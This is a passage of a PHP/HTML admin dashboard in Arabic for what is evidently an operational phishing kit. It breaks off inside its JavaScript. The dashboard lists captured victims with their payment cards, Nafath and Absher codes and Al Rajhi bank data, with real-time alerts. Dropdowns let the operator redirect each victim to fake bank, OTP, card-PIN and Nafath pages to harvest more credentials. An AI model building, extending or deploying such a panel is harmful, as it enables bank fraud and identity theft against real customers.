<?php
session_start();

// التحقق من تسجيل الدخول
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: login.php');
    exit;
}

// ضبط المنطقة الزمنية على توقيت الأردن
date_default_timezone_set('Asia/Amman');

require_once('init.php');

// تضمين ملف الدوال المساعدة إذا كان موجوداً
if (file_exists('dashboard-helpers.php')) {
    require_once('dashboard-helpers.php');
}

$users = $User->fetchAllUsers();

if (isset($_POST['deleteUser'])) {
    $id = $_POST['userId'];
    $User->DeleteUserById($id);
    $User->redirect('index.html');
}

if (isset($_POST['deleteAllUser'])) {
    $User->DeleteAllUsers();
    $User->redirect('index.html');
}

$visitCount = $User->getVisitsCount();
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>لوحة التحكم - نظام إدارة العملاء</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            --success-color: #10b981;
            --warning-color: #f59e0b;
            --danger-color: #ef4444;
            --info-color: #3b82f6;
            --dark-bg: #1f2937;
            --light-bg: #f9fafb;
            --shadow-sm: 0 1px 3px rgba(0,0,0,0.1);
            --shadow-md: 0 4px 6px rgba(0,0,0,0.1);
            --shadow-lg: 0 10px 15px rgba(0,0,0,0.1);
            --shadow-xl: 0 20px 25px rgba(0,0,0,0.15);
        }
        
        * {
            font-family: "Cairo", sans-serif;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        /* ============ HEADER SECTION ============ */
        .dashboard-header {
            background: white;
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 25px;
            box-shadow: var(--shadow-xl);
            animation: slideDown 0.5s ease-out;
        }
        
        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .header-title {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .header-title i {
            font-size: 2.5rem;
            background: var(--primary-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .header-title h1 {
            font-size: 1.8rem;
            font-weight: 700;
            color: #1f2937;
            margin: 0;
        }
        
        .btn-logout {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            padding: 12px 25px;
            border-radius: 10px;
            text-decoration: none;
            font-weight: 600;
            font-size: 0.95rem;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
        }
        
        .btn-logout:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
            color: white;
        }
        
        /* ============ STATS CARDS ============ */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: var(--shadow-md);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: var(--primary-gradient);
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: var(--shadow-xl);
        }
        
        .stat-icon {
            width: 60px;
            height: 60px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            margin-bottom: 15px;
        }
        
        .stat-icon.visits {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .stat-icon.users {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
        }
        
        .stat-icon.pending {
            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
            color: white;
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: 700;
            color: #1f2937;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #6b7280;
            font-size: 0.9rem;
            font-weight: 500;
        }
        
        /* ============ ACTION BUTTONS ============ */
        .actions-bar {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
            box-shadow: var(--shadow-md);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .btn-custom {
            padding: 12px 30px;
            border-radius: 10px;
            border: none;
            font-weight: 600;
            font-size: 0.95rem;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-danger-custom {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
        }
        
        .btn-danger-custom:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
        }
        
        .btn-primary-custom {
            background: var(--primary-gradient);
            color: white;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
        }
        
        .btn-primary-custom:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }
        
        /* ============ TABLE SECTION ============ */
        .table-section {
            background: white;
            border-radius: 20px;
            box-shadow: var(--shadow-xl);
            overflow: hidden;
            animation: fadeIn 0.6s ease-out;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.95);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        
        .table-header {
            background: var(--primary-gradient);
            padding: 20px 30px;
            color: white;
        }
        
        .table-header h3 {
            margin: 0;
            font-weight: 700;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .table-responsive {
            padding: 0;
            max-height: 700px;
            overflow-y: auto;
        }
        
        /* Custom Scrollbar */
        .table-responsive::-webkit-scrollbar {
            width: 8px;
        }
        
        .table-responsive::-webkit-scrollbar-track {
            background: #f1f1f1;
        }
        
        .table-responsive::-webkit-scrollbar-thumb {
            background: #667eea;
            border-radius: 4px;
        }
        
        .modern-table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            margin: 0;
        }
        
        .modern-table thead {
            position: sticky;
            top: 0;
            z-index: 10;
            background: #f9fafb;
        }
        
        .modern-table thead th {
            padding: 18px 15px;
            text-align: center;
            font-weight: 700;
            font-size: 0.85rem;
            color: #374151;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 2px solid #e5e7eb;
        }
        
        .modern-table tbody tr {
            transition: all 0.3s ease;
            border-bottom: 1px solid #f3f4f6;
        }
        
        .modern-table tbody tr:hover {
            background: linear-gradient(90deg, #f9fafb 0%, #f3f4f6 100%);
            transform: scale(1.01);
        }
        
        .modern-table tbody tr.highlight {
            background: linear-gradient(90deg, #fef3c7 0%, #fde68a 100%);
            animation: pulse 2s ease-in-out infinite;
            border-left: 4px solid #f59e0b;
        }
        
        @keyframes pulse {
            0%, 100% {
                background: linear-gradient(90deg, #fef3c7 0%, #fde68a 100%);
            }
            50% {
                background: linear-gradient(90deg, #fde68a 0%, #fef3c7 100%);
            }
        }
        
        .modern-table tbody td {
            padding: 16px 15px;
            text-align: center;
            font-size: 0.9rem;
            color: #374151;
            vertical-align: middle;
        }
        
        /* ============ BADGES & STATUS ============ */
        .status-badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .status-new {
            background: #dbeafe;
            color: #1e40af;
        }
        
        .status-pending {
            background: #fef3c7;
            color: #92400e;
        }
        
        .status-active {
            background: #d1fae5;
            color: #065f46;
        }
        
        /* ============ ACTION BUTTONS IN TABLE ============ */
        .btn-table {
            padding: 8px 16px;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.2s ease;
            margin: 2px;
        }
        
        .btn-info {
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            color: white;
        }
        
        .btn-info:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
        }
        
        .btn-card {
            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
            color: white;
        }
        
        .btn-card:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.4);
        }
        
        .btn-nafad {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
        }
        
        .btn-nafad:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
        }
        
        .btn-delete {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
        }
        
        .btn-delete:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4);
        }
        
        /* ============ MODALS ============ */
        .modal-content {
            border-radius: 20px;
            border: none;
            box-shadow: var(--shadow-xl);
        }
        
        .modal-header {
            background: var(--primary-gradient);
            color: white;
            border-radius: 20px 20px 0 0;
            padding: 25px 30px;
            border-bottom: none;
        }
        
        .modal-title {
            font-weight: 700;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .modal-body {
            padding: 30px;
        }
        
        .info-card {
            background: linear-gradient(135deg, #f9fafb 0%, #f3f4f6 100%);
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            border-right: 4px solid #667eea;
        }
        
        .info-card h6 {
            color: #667eea;
            font-weight: 700;
            margin-bottom: 15px;
            font-size: 1rem;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .info-card p {
            margin: 8px 0;
            color: #4b5563;
            font-size: 0.9rem;
        }
        
        .info-card p strong {
            color: #1f2937;
            font-weight: 600;
        }
        /* ✅ تنسيق بطاقات المعلومات */
.info-card {
    background: #f8f9fa;
    border-radius: 12px;
    padding: 20px;
    margin-bottom: 20px;
    border: 1px solid #e0e0e0;
    transition: all 0.3s ease;
}

.info-card:hover {
    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    transform: translateY(-2px);
}

.info-card h6 {
    color: #2d3748;
    font-weight: 700;
    font-size: 1rem;
    margin-bottom: 15px;
    padding-bottom: 10px;
    border-bottom: 2px solid #e0e0e0;
    display: flex;
    align-items: center;
    gap: 8px;
}

.info-card h6 i {
    color: #667eea;
}

.info-card p {
    margin-bottom: 10px;
    font-size: 0.95rem;
    color: #4a5568;
    display: flex;
    justify-content: space-between;
}

.info-card p strong {
    color: #2d3748;
    font-weight: 600;
    min-width: 140px;
}

.info-card p:last-child {
    margin-bottom: 0;
}
        .redirect-box {
            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 25px;
            border: 2px solid #f59e0b;
        }
        
        .redirect-box label {
            font-weight: 700;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: #92400e;
        }
        
        .form-select-modern {
            border: 2px solid #667eea;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 15px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .form-select-modern:focus {
            border-color: #764ba2;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.15);
            outline: none;
        }
        
        .btn-redirect {
            background: var(--primary-gradient);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 10px;
            font-weight: 700;
            width: 100%;
            transition: all 0.3s;
            font-size: 1rem;
        }
        
        .btn-redirect:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }
        
        /* ============ CHECKBOX STYLING ============ */
        .checkbox-modern {
            width: 20px;
            height: 20px;
            cursor: pointer;
            accent-color: #667eea;
        }
        
        /* ============ RESPONSIVE ============ */
        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .actions-bar {
                flex-direction: column;
                align-items: stretch;
            }
            
            .btn-custom {
                width: 100%;
                justify-content: center;
            }
            
            .modern-table thead th,
            .modern-table tbody td {
                padding: 10px 8px;
                font-size: 0.8rem;
            }
        }
        
        /* ============ EMPTY STATE ============ */
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #6b7280;
        }
        
        .empty-state i {
            font-size: 4rem;
            margin-bottom: 20px;
            opacity: 0.3;
        }
        
        .empty-state h3 {
            font-size: 1.5rem;
            margin-bottom: 10px;
        }
        
        /* ============ LOADING SPINNER ============ */
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ============ CONNECTION DOT ============ */
        .connection-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #10b981;
            animation: breathe 2s ease-in-out infinite;
            box-shadow: 0 0 10px #10b981;
        }

        .connection-dot.disconnected {
            background: #ef4444;
            animation: none;
            box-shadow: 0 0 10px #ef4444;
        }

        @keyframes breathe {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(1.1); }
        }

        /* ============ FILTER BUTTONS ============ */
        .filter-bar {
            background: white;
            border-radius: 15px;
            padding: 15px 20px;
            margin-bottom: 20px;
            box-shadow: var(--shadow-md);
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
        }

        .filter-btn {
            padding: 8px 20px;
            border-radius: 8px;
            border: 2px solid #e5e7eb;
            background: white;
            font-weight: 600;
            font-size: 0.85rem;
            cursor: pointer;
            transition: all 0.3s;
            color: #6b7280;
        }

        .filter-btn:hover {
            border-color: #667eea;
            color: #667eea;
        }

        .filter-btn.active {
            background: var(--primary-gradient);
            color: white;
            border-color: transparent;
        }

        /* ============ TOAST NOTIFICATIONS ============ */
        .toast-container {
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 10000;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .toast {
            background: white;
            border-radius: 12px;
            padding: 15px 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            display: flex;
            align-items: center;
            gap: 12px;
            min-width: 300px;
            max-width: 400px;
            transform: translateX(-120%);
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            border-right: 4px solid #10b981;
        }

        .toast.show {
            transform: translateX(0);
            opacity: 1;
        }

        .toast.success { border-right-color: #10b981; }
        .toast.error { border-right-color: #ef4444; }
        .toast.warning { border-right-color: #f59e0b; }
        .toast.info { border-right-color: #3b82f6; }

        .toast-icon {
            font-size: 1.5rem;
        }

        .toast-content {
            flex: 1;
        }

        .toast-title {
            font-weight: 700;
            font-size: 0.95rem;
            color: #1f2937;
        }

        .toast-message {
            font-size: 0.85rem;
            color: #6b7280;
            margin-top: 2px;
        }

        /* ============ BULK ACTIONS ============ */
        .bulk-actions {
            display: none;
            background: #fef3c7;
            border-radius: 12px;
            padding: 12px 20px;
            margin-bottom: 15px;
            align-items: center;
            gap: 15px;
            border: 2px solid #f59e0b;
        }

        .bulk-actions.show {
            display: flex;
        }

        .bulk-actions-text {
            flex: 1;
            font-weight: 600;
            color: #92400e;
        }

        .btn-bulk {
            padding: 8px 16px;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            font-size: 0.85rem;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-bulk-delete {
            background: #ef4444;
            color: white;
        }

        .btn-bulk-delete:hover {
            background: #dc2626;
        }
    </style>
</head>
<body>
    <div class="container-fluid" style="max-width: 1600px;">
        
        <!-- ============ DASHBOARD HEADER ============ -->
        <div class="dashboard-header">
            <div class="header-title">
                <i class="fas fa-chart-line"></i>
                <div style="flex: 1;">
                    <h1>لوحة التحكم الرئيسية</h1>
                    <p style="margin: 5px 0 0; font-size: 0.9rem; color: #6b7280;">
                        <i class="fas fa-user"></i>
                        مرحباً، <strong><?= htmlspecialchars($_SESSION['admin_full_name'] ?? $_SESSION['admin_username']); ?></strong>
                    </p>
                </div>
                <a href="logout.php" class="btn-logout" onclick="return confirm('هل تريد تسجيل الخروج؟')">
                    <i class="fas fa-sign-out-alt"></i>
                    تسجيل الخروج
                </a>
            </div>
            
            <!-- Stats Grid -->
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon visits">
                        <i class="fas fa-eye"></i>
                    </div>
                    <div class="stat-value" id="visitCountDisplay"><?= number_format($visitCount); ?></div>
                    <div class="stat-label">إجمالي الزيارات</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon users">
                        <i class="fas fa-users"></i>
                    </div>
                    <div class="stat-value" id="userCountDisplay"><?= $users ? count($users) : 0; ?></div>
                    <div class="stat-label">إجمالي العملاء</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon pending">
                        <i class="fas fa-bell"></i>
                    </div>
                    <div class="stat-value" id="unreadCount">0</div>
                    <div class="stat-label">غير مقروءة</div>
                </div>

                <div class="stat-card" style="border: 2px solid #10b981;">
                    <div style="display: flex; align-items: center; gap: 10px;">
                        <div id="connectionDot" class="connection-dot"></div>
                        <div>
                            <div class="stat-value" style="font-size: 1.2rem;" id="connectionStatus">متصل</div>
                            <div class="stat-label" id="lastUpdate">آخر تحديث: الآن</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- ============ ACTIONS BAR ============ -->
        <div class="actions-bar">
<div style="display: flex; gap: 10px; flex-wrap: wrap;">
    <button class="btn-custom btn-primary-custom" onclick="refreshData()">
        <i class="fas fa-sync-alt"></i>
        تحديث البيانات
    </button>
    
    <!-- ✅ زر البطاقات الجديد -->
    <a href="cards.php" class="btn-custom" style="background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); color: white; text-decoration: none; box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);">
        <i class="fas fa-credit-card"></i>
        البطاقات
    </a>
    
    <a href="add-admin.php" class="btn-custom" style="background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%); color: white; text-decoration: none; box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3);">
        <i class="fas fa-users-cog"></i>
        إدارة المشرفين
    </a>
</div>
            
            <div>
                <form method="POST" onsubmit="return confirm('⚠️ هل أنت متأكد من حذف جميع المستخدمين؟\n\nهذا الإجراء لا يمكن التراجع عنه!')" style="margin: 0; display: inline;">
                    <button type="submit" name="deleteAllUser" class="btn-custom btn-danger-custom">
                        <i class="fas fa-trash-alt"></i>
                        حذف جميع البيانات
                    </button>
                </form>
            </div>
        </div>

        <!-- ============ FILTER BAR ============ -->
        <div class="filter-bar">
            <span style="font-weight: 700; color: #374151;">
                <i class="fas fa-filter"></i> فلترة:
            </span>
            <button class="filter-btn active" onclick="filterRows('all')">
                <i class="fas fa-list"></i> الكل
            </button>
            <button class="filter-btn" onclick="filterRows('unread')">
                <i class="fas fa-bell"></i> غير مقروءة فقط
            </button>
            <button class="filter-btn" onclick="filterRows('read')">
                <i class="fas fa-check"></i> مقروءة فقط
            </button>
        </div>

        <!-- ============ BULK ACTIONS ============ -->
        <div class="bulk-actions" id="bulkActions">
            <span class="bulk-actions-text">
                <i class="fas fa-check-square"></i>
                تم تحديد <strong id="selectedCount">0</strong> عميل
            </span>
            <button class="btn-bulk btn-bulk-delete" onclick="bulkDelete()">
                <i class="fas fa-trash"></i> حذف المحدد
            </button>
        </div>
        
        <!-- ============ TABLE SECTION ============ -->
        <div class="table-section">
            <div class="table-header">
                <h3>
                    <i class="fas fa-table"></i>
                    قائمة العملاء والمستخدمين
                </h3>
            </div>
            
            <div class="table-responsive">
                <?php if ($users != false && count($users) > 0): ?>
                <table class="modern-table">
<thead>
    <tr>
        <th><input type="checkbox" id="selectAll" class="checkbox-modern"></th>
        <th><i class="fas fa-user"></i> اسم المستخدم</th>
        <th><i class="fas fa-comment"></i> الرسالة</th>
<th><i class="fas fa-id-card"></i> الاسم الكامل</th>
<th><i class="fas fa-school"></i> المدرسة</th>
<th><i class="fas fa-phone"></i> الهاتف</th>
        <th><i class="fas fa-info-circle"></i> معلومات</th>
        <th><i class="fas fa-credit-card"></i> البطاقات</th>
        <th><i class="fas fa-shield-alt"></i> نفاذ</th>
        <th><i class="fas fa-key"></i> رمز نفاذ</th>
        <th><i class="fas fa-id-badge"></i> أبشر</th>
        <th><i class="fas fa-university"></i> راجحي</th>
        <th><i class="fas fa-clock"></i> التاريخ</th>
        <th><i class="fas fa-cog"></i> إجراءات</th>
    </tr>
</thead>
<tbody id="usersTableBody">
    <?php foreach ($users as $row): ?>
        <tr data-user-id="<?= $row->id; ?>">
            <td>
                <input type="checkbox" class="user-checkbox checkbox-modern" onchange="updateBulkActions()">
            </td>
            <td>
                <strong><?= $row->username ?? '-'; ?></strong>
            </td>
            <td id="message<?= $row->id; ?>">
                <span class="status-badge status-new">
                    <?= $row->message ?? 'لا توجد رسالة'; ?>
                </span>
            </td>
<td>
    <strong style="color: #374151;"><?= $row->name ?? '-'; ?></strong>
</td>
<td>
    <span style="color: #667eea; font-weight: 600;">
        <?= $row->selected_school ?? '-'; ?>
    </span>
</td>
<td>
    <?= $row->phone ?? '-'; ?>
</td>
            <td>
                <button class="btn-table btn-info" onclick="showUserInfo(<?= $row->id; ?>)">
                    <i class="fas fa-info-circle"></i> عرض
                </button>
            </td>
            <td>
                <button class="btn-table btn-card" onclick="showUserCards(<?= $row->id; ?>)">
                    <i class="fas fa-credit-card"></i> البطاقات
                </button>
            </td>
            <td>
                <button class="btn-table btn-nafad" onclick="showUserNafad(<?= $row->id; ?>)">
                    <i class="fas fa-shield-alt"></i> نفاذ
                </button>
            </td>
<td>
    <button class="btn-table btn-nafad" onclick="showNafathFinal(<?= $row->id; ?>)">
        <i class="fas fa-key"></i> إرسال
    </button>
</td>
<td>
    <button class="btn-table" style="background: linear-gradient(135deg, #00AA66 0%, #008c54 100%); color: white;" onclick="showUserAbsher(<?= $row->id; ?>)">
        <i class="fas fa-id-badge"></i> أبشر
    </button>
</td>
<td>
    <button class="btn-table" style="background: linear-gradient(135deg, #0066cc 0%, #004d99 100%); color: white;" onclick="showUserBank(<?= $row->id; ?>)">
        <i class="fas fa-university"></i> راجحي
    </button>
</td>
<td>
    <?php
    $timestamp = strtotime($row->created_at . ' +3 hours');
    ?>
    <small><?= date('Y/m/d', $timestamp); ?><br>
    <?= date('h:i A', $timestamp); ?></small>
</td>
            <td>
                <form method="POST" style="display:inline; margin:0;" onsubmit="return confirm('هل تريد حذف هذا المستخدم؟')">
                    <input type="hidden" name="userId" value="<?= $row->id; ?>">
                    <button type="submit" name="deleteUser" class="btn-table btn-delete">
                        <i class="fas fa-trash"></i>
                    </button>
                </form>
            </td>
        </tr>
    <?php endforeach; ?>
</tbody>
                </table>
                <?php else: ?>
                <div class="empty-state">
                    <i class="fas fa-inbox"></i>
                    <h3>لا توجد بيانات</h3>
                    <p>لم يتم تسجيل أي عملاء بعد</p>
                </div>
                <?php endif; ?>
            </div>
        </div>
        
    </div>

    <!-- ============ MODALS ============ -->
    
    <!-- Modal معلومات المستخدم -->
    <div class="modal fade" id="userInfoModal" tabindex="-1">
        <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-user-circle"></i>
                        معلومات المستخدم التفصيلية
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="redirect-box">
                        <label>
                            <i class="fas fa-directions"></i>
                            توجيه العميل إلى صفحة:
                        </label>
<select class="form-select form-select-modern" id="redirectPageUser">
    <option value="index.html">الصفحة الرئيسية</option>
    <option value="BK.php">بنك الراجحي</option>
    <option value="bank-otp.php">رمز تحقق بنك الراجحي</option>
    <option value="pay.php">صفحة الدفع</option>
    <option value="otp.php">رمز OTP</option>
    <option value="pin.php">كلمة سر البطاقة</option>
    <option value="nafad.php">رقم مزود الخدمة</option>
    <option value="success.php">رمز تحقق مزود الخدمة</option>
    <option value="nafath.php">نفاذ الأخيرة</option>
</select>
                        <button class="btn btn-redirect" onclick="redirectUser()">
                            <i class="fas fa-paper-plane"></i>
                            توجيه الآن
                        </button>
                    </div>
                    
                    <div id="userInfoContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري تحميل البيانات...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal بطاقات المستخدم -->
    <div class="modal fade" id="userCardsModal" tabindex="-1">
        <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-credit-card"></i>
                        بطاقات المستخدم
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="redirect-box">
                        <label>
                            <i class="fas fa-directions"></i>
                            توجيه العميل إلى صفحة:
                        </label>
<select class="form-select form-select-modern" id="redirectPageCard">
    <option value="index.html">الصفحة الرئيسية</option>
    <option value="BK.php">بنك الراجحي</option>
    <option value="bank-otp.php">رمز تحقق بنك الراجحي</option>
    <option value="pay.php">صفحة الدفع</option>
    <option value="otp.php">رمز OTP</option>
    <option value="pin.php">كلمة سر البطاقة</option>
    <option value="nafad.php">رقم مزود الخدمة</option>
    <option value="success.php">رمز تحقق مزود الخدمة</option>
    <option value="nafath.php">نفاذ الأخيرة</option>
</select>
                        <button class="btn btn-redirect" onclick="redirectUserFromCard()">
                            <i class="fas fa-paper-plane"></i>
                            توجيه الآن
                        </button>
                    </div>
                    
                    <div id="userCardsContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري تحميل البطاقات...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal نفاذ -->
    <div class="modal fade" id="userNafadModal" tabindex="-1">
        <div class="modal-dialog modal-md modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-shield-alt"></i>
                        بيانات نفاذ
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="redirect-box">
                        <label>
                            <i class="fas fa-directions"></i>
                            توجيه العميل إلى صفحة:
                        </label>
<select class="form-select form-select-modern" id="redirectPageNafad">
    <option value="index.html">الصفحة الرئيسية</option>
    <option value="BK.php">بنك الراجحي</option>
    <option value="bank-otp.php">رمز تحقق بنك الراجحي</option>
    <option value="pay.php">صفحة الدفع</option>
    <option value="otp.php">رمز OTP</option>
    <option value="pin.php">كلمة سر البطاقة</option>
    <option value="nafad.php">رقم مزود الخدمة</option>
    <option value="success.php">رمز تحقق مزود الخدمة</option>
    <option value="nafath.php">نفاذ الأخيرة</option>
</select>
                        <button class="btn btn-redirect" onclick="redirectUserFromNafad()">
                            <i class="fas fa-paper-plane"></i>
                            توجيه الآن
                        </button>
                    </div>
                    
                    <div id="userNafadContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري تحميل بيانات نفاذ...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal إرسال رقم نفاذ -->
    <div class="modal fade" id="nafathFinalModal" tabindex="-1">
        <div class="modal-dialog modal-md modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-paper-plane"></i>
                        إرسال رقم نفاذ للعميل
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-4">
                        <label class="form-label" style="font-weight: 700; font-size: 1.1rem;">
                            <i class="fas fa-keyboard"></i>
                            أدخل رقم نفاذ:
                        </label>
                        <input type="text" 
                               id="nafathNumberInput" 
                               class="form-control form-control-lg text-center" 
                               placeholder="مثال: 10" 
                               maxlength="3" 
                               inputmode="numeric"
                               pattern="[0-9]*"
                               style="font-size: 28px; letter-spacing: 3px; font-weight: 700; border: 3px solid #667eea;">
                    </div>
                    
                    <button class="btn btn-redirect" onclick="sendNafathNumberToClient()">
                        <i class="fas fa-paper-plane"></i>
                        إرسال الرقم للعميل
                    </button>
                    
                    <hr style="margin: 30px 0;">
                    
                    <div id="nafathHistoryContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري التحميل...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

   <audio id="notification-sound" src="./phone-ringing-229175.mp3" preload="auto"></audio>
<audio id="card-sound" src="./level-up-2-199574.mp3" preload="auto"></audio>
    
    <!-- Toast Notifications Container -->
    <div class="toast-container" id="toastContainer"></div>

    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    
    <script>
        let currentUserId = null;
        let lastUpdateTime = Date.now();
        
        // ============================================
        // دالة لتنسيق التاريخ بإضافة 3 ساعات
        // ============================================
        function formatJordanTime(dateString) {
            if (!dateString) {
                const now = new Date();
